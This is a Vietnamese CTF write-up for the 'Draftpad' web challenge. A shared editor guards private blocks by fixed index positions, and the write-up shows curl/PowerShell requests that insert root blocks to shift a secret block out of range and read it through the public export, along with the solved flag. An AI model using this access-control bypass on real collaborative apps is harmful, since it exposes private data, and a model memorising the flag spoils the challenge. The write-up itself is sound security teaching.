---
title: "Draftpad"
category: "Web"
tags: ["crdt", "access-control"]
solve_date: "2026-10-11T08:31:00+07:00"
language: "vi"
---

# Draftpad

**Flag:** `isfcr{merge_shifts_the_wall_not_the_window}`
**Dịch vụ:** `https://isfcrpesu-draftpad.chals.io` (Node.js/Express, shared instance)

## Đề bài

Draftpad là editor dùng chung, gồm phần công khai và phần riêng tư. Mục tiêu là đọc nội dung riêng tư qua API của ứng dụng.

## Phân tích

Ứng dụng cung cấp `/api/document`, `/api/log`, `/api/ops` và `/api/export/public`. Document là cây block, được làm phẳng theo thứ tự cây và `clock` thành danh sách có `index`. Hai pin `blk_pstart` và `blk_pend` xác định vùng riêng tư.

Lỗi nằm ở việc kiểm tra `index` hiện tại theo hai `position` cố định 18 và 21. Chèn hoặc xóa block làm thay đổi thứ tự danh sách nhưng không cập nhật pin. Vì vậy, block bí mật có thể ra ngoài `[18,21)`, còn block công khai vô tình rơi vào vùng bị che.

  ```json
  "pins": [
    { "kind": "private_start", "block_id": "blk_pstart", "position": 18 },
    { "kind": "private_end",   "block_id": "blk_pend",   "position": 21 }
  ]
  ```

## Lời giải

1. Đọc document và log để xác định hai pin cùng block `blk_flag`.
2. Trạng thái shared instance đã có thao tác của các kết nối trước: `blk_flag` nằm ở index 9 và `is_private: false`. Hai block khách ở index 19–20 lại bị che. Đây là bằng chứng việc phân quyền dựa vào vị trí cố định thay vì danh tính block.
3. Gọi `/api/export/public` để đối chiếu: nội dung xuất công khai chứa cả phần riêng tư và flag.

Trên instance mới, chèn block gốc với `parent_id: null`, `clock: 1000000`, hoặc xóa block không bị pin phía trước vùng riêng tư. Sau mỗi lần thao tác, kiểm tra `is_private` của `blk_flag`. Khi block nằm ngoài vùng cố định, đọc public export.

   ```text
   {"index":9,"id":"blk_flag","parent_id":"blk_pstart","clock":1000,
    "author":"admin","content":"release flag: isfcr{merge_shifts_the_wall_not_the_window}",
    "is_private":false,"is_pinned":false}
   ```

   ```text
   --- confidential (do not export) ---

   BETWEEN

   release flag: isfcr{merge_shifts_the_wall_not_the_window}

   --- end confidential ---
   ```

## Kết quả

Flag được đọc từ document và public export. Hai phản hồi cùng chứa một giá trị; tài liệu nguồn không lưu phản hồi của scoring service.

`isfcr{merge_shifts_the_wall_not_the_window}`

## Tái hiện

Dùng PowerShell với instance còn hoạt động. Trạng thái shared instance có thể thay đổi, nên kiểm tra `is_private` thay vì phụ thuộc vào index 9. Khi thao tác thành công, `blk_flag` có `is_private: false` và public export chứa flag. Các lệnh và output dưới đây được giữ từ bản nguồn.

```powershell
$c = 'C:\Program Files\Git\mingw64\bin\curl.exe'

# 1. Inspect the document: note the fixed pin positions vs the current block indexes
&$c -sk https://isfcrpesu-draftpad.chals.io/api/document | ConvertFrom-Json

# 2. Shift indexes without touching the pinned blocks: add root blocks with a high clock
&$c -sk -X POST https://isfcrpesu-draftpad.chals.io/api/ops -H 'content-type: application/json' -d '{"type":"insert","id":"shift-proof-1","parent_id":null,"clock":1000000,"author":"guest","content":"proof"}'

# 3. Repeat step 2 (or delete plain guest blocks ahead of the pin) until blk_flag leaves [18,21):
&$c -sk https://isfcrpesu-draftpad.chals.io/api/document | ConvertFrom-Json |
  ForEach-Object blocks | Where-Object { $_.id -eq 'blk_flag' }

# 4. Once is_private is false, the public export leaks the confidential section:
&$c -sk https://isfcrpesu-draftpad.chals.io/api/export/public
```

```text
release flag: isfcr{merge_shifts_the_wall_not_the_window}
```
